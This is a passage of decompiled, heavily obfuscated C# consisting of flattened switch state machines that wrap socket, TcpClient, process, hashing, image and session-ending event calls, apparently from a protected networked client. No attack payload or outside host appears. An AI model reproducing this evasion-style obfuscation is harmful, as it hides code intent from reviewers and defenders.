    return obj as ImageFormat;
  }

  internal static void ႠႥ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] byte obj1, [In] char obj2, [In] int obj3) where \u0021\u00210 : MemoryStream
  {
    char[] ⴃ = nqcpjoekzw.Ⴃ;
    byte[] ⴗ = Ⴄ.Ⴜ.Ⴗ;
    int num1 = 7;
    int num2;
    int num3;
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 4:
          ++num2;
          int num4 = (int) obj1;
          num3 = num4 * num4;
          goto case 3;
        case 1:
          goto label_12;
        case 2:
          num1 = 4;
          continue;
        case 3:
          num3 = (int) obj1 + num3;
          num1 = 8;
          continue;
        case 5:
        case 9:
          obj0.WriteByte(obj1);
          goto case 0;
        case 6:
          int num5;
          switch ((obj3 ^ (int) obj2) - 26 ^ num2)
          {
            case 0:
              num5 = 5;
              break;
            default:
              num5 = (int) ⴃ[242] - 17546;
              break;
          }
          num1 = num5;
          continue;
        case 8:
          num1 = num3 % 2 != 0 ? 6 : (int) ⴗ[110] - 232;
          continue;
        default:
          num2 = 0;
          num1 = 6;
          continue;
      }
    }
label_12:;
  }

  internal static void ႠႣ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] char obj1, [In] int obj2) where \u0021\u00210 : Image
  {
    char[] ⴃ = nqcpjoekzw.Ⴃ;
    byte[] ⴗ = Ⴄ.Ⴜ.Ⴗ;
    int num1 = 8;
    int num2;
    int num3;
    while (true)
    {
      switch (num1)
      {
        case 0:
          goto label_12;
        case 1:
          obj0.Dispose();
          goto case 5;
        case 2:
          num1 = num3 % 2 != 0 ? 4 : (int) ⴃ[312] - 13065;
          continue;
        case 3:
        case 7:
          num1 = (int) ⴗ[9] - 192;
          continue;
        case 4:
          int num4;
          switch (((int) obj1 ^ obj2) - 31 ^ num2)
          {
            case 0:
              num4 = 1;
              break;
            default:
              num4 = (int) ⴃ[19] - 64891;
              break;
          }
          num1 = num4;
          continue;
        case 5:
          ++num2;
          goto case 6;
        case 6:
          int num5 = (int) obj1;
          int num6 = num5 * num5;
          num3 = (int) obj1 + num6;
          num1 = (int) ⴗ[213] - 228;
          continue;
        case 9:
          goto label_13;
        default:
          num2 = 0;
          num1 = 4;
          continue;
      }
    }
label_12:
    return;
label_13:;
  }

  internal static byte[] ႠႤ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] byte[] obj1, [In] char obj2, [In] short obj3) where \u0021\u00210 : HashAlgorithm
  {
    char[] ⴃ = nqcpjoekzw.Ⴃ;
    byte[] ⴗ = Ⴄ.Ⴜ.Ⴗ;
label_3:
    int num1 = 0;
    int num2 = (int) ⴗ[215] - (int) ⴗ[214];
    Array array;
    while (true)
    {
      switch (num2)
      {
        case 0:
        case 3:
        case 9:
          goto label_11;
        case 1:
          num2 = (int) ⴃ[343] - 22143;
          continue;
        case 2:
          goto label_3;
        case 4:
        case 5:
          ++num1;
          num2 = 367 < 1101 / 3 - 124 ? (int) ⴃ[323] - 27597 : 0;
          continue;
        case 6:
          int num3;
          switch (((int) obj2 ^ (int) obj3) - 48 ^ num1)
          {
            case 0:
              num3 = (int) ⴗ[20] - 82;
              break;
            default:
              num3 = 10;
              break;
          }
          num2 = num3;
          continue;
        case 8:
          array = (Array) obj0.ComputeHash(obj1);
          num2 = (int) ⴃ[188] - 31022;
          continue;
        case 10:
          array = (Array) obj1;
          num2 = (int) ⴗ[217] - 95;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (pebdynyveq.ႠႤ);
          num2 = (int) ⴃ[327] - 15014;
          continue;
      }
    }
label_11:
    return (byte[]) array;
  }

  internal static Process ႠႼ([In] char obj0, [In] short obj1)
  {
    char[] ⴃ = nqcpjoekzw.Ⴃ;
    byte[] ⴗ = Ⴄ.Ⴜ.Ⴗ;
label_3:
    int num1 = 0;
    int num2 = 5;
    Component component;
    while (true)
    {
      switch (num2)
      {
        case 0:
        case 1:
        case 10:
          goto label_12;
        case 3:
          component = (Component) null;
          num2 = 8;
          continue;
        case 4:
        case 9:
          num2 = (int) ⴗ[99] - 249;
          continue;
        case 5:
          int num3;
          switch (((int) obj1 ^ (int) obj0) - 41 ^ num1)
          {
            case 0:
              num3 = (int) ⴃ[201] - 40204;
              break;
            default:
              num3 = (int) ⴃ[28] - 31998;
              break;
          }
          num2 = num3;
          continue;
        case 6:
          num2 = (int) ⴃ[268] - 49832;
          continue;
        case 7:
          goto label_3;
        case 8:
          ++num1;
          int num4 = (int) obj0;
          num2 = (num4 * num4 + (int) obj0) % 2 == 0 ? (int) ⴃ[274] - 8539 : 6;
          continue;
        case 11:
          component = (Component) Process.GetCurrentProcess();
          num2 = (int) ⴗ[26] - 239;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (pebdynyveq.ႠႼ);
          num2 = (int) ⴃ[211] - 41011;
          continue;
      }
    }
label_12:
    return component as Process;
  }

  internal static void ႳႭ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] char obj1, [In] char obj2) where \u0021\u00210 : TcpClient
  {
    int num1 = 2;
    int num2;
    int num3;
    int num4;
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 5:
          ++num2;
          num3 = 2421;
          num4 = 519;
          goto case 1;
        case 1:
        case 3:
          num1 = 807 < num3 / 3 - num4 ? 4 : 6;
          continue;
        case 4:
          int num5;
          switch (((int) obj1 ^ (int) obj2) - 31 ^ num2)
          {
            case 0:
              num5 = 7;
              break;
            default:
              num5 = 8;
              break;
          }
          num1 = num5;
          continue;
        case 6:
          goto label_11;
        case 7:
          obj0.Close();
          goto case 0;
        case 8:
          num1 = 5;
          continue;
        default:
          num2 = 0;
          num1 = 4;
          continue;
      }
    }
label_11:;
  }

  internal static int ႳႷ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] int obj1, [In] short obj2) where \u0021\u00210 : TcpClient
  {
    byte[] ⴗ = Ⴄ.Ⴜ.Ⴗ;
    char[] ⴃ = nqcpjoekzw.Ⴃ;
label_3:
    int num1 = 0;
    int num2 = 6;
    int num3;
    int num4;
    int num5;
    while (true)
    {
      switch (num2)
      {
        case 0:
          goto label_3;
        case 1:
          num2 = 6;
          continue;
        case 2:
          num3 = 3;
          num2 = (int) ⴃ[387] - 40244;
          continue;
        case 3:
          ++num1;
          num4 = 165;
          num5 = 643;
          goto case 4;
        case 4:
          num2 = 3215 > num5 - num4 * 5 ? 11 : 1;
          continue;
        case 5:
          num3 = obj0.Available;
          num2 = (int) ⴃ[146] - 15026;
          continue;
        case 6:
          int num6;
          switch (((int) obj2 ^ obj1) - 111 ^ num1)
          {
            case 0:
              num6 = 5;
              break;
            default:
              num6 = (int) ⴗ[150] - (int) ⴗ[113];
              break;
          }
          num2 = num6;
          continue;
        case 7:
        case 11:
          goto label_13;
        case 10:
          num2 = (int) ⴗ[177] - 122;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (pebdynyveq.ႳႷ);
          num2 = 0;
          continue;
      }
    }
label_13:
    return num3;
  }

  internal static bool ႳႠ<\u0021\u00210>(
    [In] \u0021\u00210 obj0,
    [In] int obj1,
    [In] SelectMode obj2,
    [In] short obj3,
    [In] char obj4)
    where \u0021\u00210 : Socket
  {
    byte[] ⴗ = Ⴄ.Ⴜ.Ⴗ;
    char[] ⴃ = nqcpjoekzw.Ⴃ;
label_3:
    int num1 = 0;
    int num2 = (int) ⴗ[27] - 66;
    bool flag;
    int num3;
    while (true)
    {
      switch (num2)
      {
        case 0:
          num2 = num3 % 2 != 0 ? (int) ⴃ[292] - 61424 : 11;
          continue;
        case 1:
          int num4 = (int) obj4;
          int num5 = num4 * num4;
          num3 = (int) obj4 + num5;
          num2 = (int) ⴗ[42] - (int) ⴗ[42];
          continue;
        case 3:
        case 5:
          int num6;
          switch (((int) obj4 ^ (int) obj3) - 55 ^ num1)
          {
            case 0:
              num6 = (int) ⴗ[129] - 76;
              break;
            default:
              num6 = 10;
              break;
          }
          num2 = num6;
          continue;
        case 4:
          flag = obj0.Poll(obj1, obj2);
          num2 = (int) ⴃ[225] - 47865;
          continue;
        case 6:
        case 7:
          goto label_3;
        case 8:
          num2 = 3;
          continue;
        case 9:
          ++num1;
          goto case 1;
        case 10:
          flag = true;
          num2 = (int) ⴃ[203] - 40145;
          continue;
        case 11:
          goto label_13;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (pebdynyveq.ႳႠ);
          num2 = 6;
          continue;
      }
    }
label_13:
    return flag;
  }

  internal static void ႳႳ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] int obj1, [In] char obj2) where \u0021\u00210 : SessionEndingEventHandler
  {
    char[] ⴃ = nqcpjoekzw.Ⴃ;
    int num1 = 4;
    int num2;
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 1:
          SystemEvents.SessionEnding += (SessionEndingEventHandler) obj0;
          goto case 6;
        case 2:
          goto label_10;
        case 3:
          num1 = (int) ⴃ[225] - 47868;
          continue;
        case 5:
          goto label_11;
        case 6:
          ++num2;
          num1 = 905 < 1810 / 2 - 75 ? 7 : (int) ⴃ[16] - 5741;
          continue;
        case 7:
        case 8:
          int num3;
          switch ((obj1 ^ (int) obj2) - 3 ^ num2)
          {
            case 0:
              num3 = (int) ⴃ[268] - 49837;
              break;
            default:
              num3 = (int) ⴃ[67] - 4359;
              break;
          }
          num1 = num3;
          continue;
        default:
          num2 = 0;
          num1 = 7;
          continue;
      }
    }
label_10:
    return;
label_11:;
  }

  [StructLayout(LayoutKind.Explicit, Size = 1365, Pack = 1)]
  private struct Ⴅ
  {
  }

  [StructLayout(LayoutKind.Auto)]
  internal struct Ⴓ
  {
    internal byte[] Ⴅ;
  }
}
